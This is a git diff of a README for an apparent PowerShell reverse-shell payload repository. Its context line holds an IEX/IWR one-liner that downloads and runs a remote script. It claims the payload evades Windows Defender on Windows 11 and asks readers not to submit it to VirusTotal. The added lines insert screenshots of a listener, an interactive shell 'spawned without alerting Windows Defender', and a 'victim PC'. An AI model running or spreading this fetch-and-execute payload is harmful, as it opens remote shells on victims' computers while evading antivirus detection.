@@ -14,3 +14,19 @@ IEX (IWR 'https://raw.githubusercontent.com/anonymous300502/powershell_payload/m
 ### Currently undetectable by the latest updated version of windows defender on Win 11 ( last tested on 17:00 IST June 13th 2024) 
 
 Please dont upload the script on virus total :) 
+
+
+# SCREENSHOTS:-
+<br>
+## Listener - 
+<br>
+<img src="https://github.com/anonymous300502/powershell_payload/blob/main/listener.png.png">
+<br>
+## Spawned Connection without alerting Windows Defender -
+<br>
+<img scr="https://github.com/anonymous300502/powershell_payload/blob/main/spawned_interactive_shell.png.png">
+<br>
+## Victim Pc - 
+<br>
+<img src="https://github.com/anonymous300502/powershell_payload/blob/main/victimpc.png.png">
+<br>
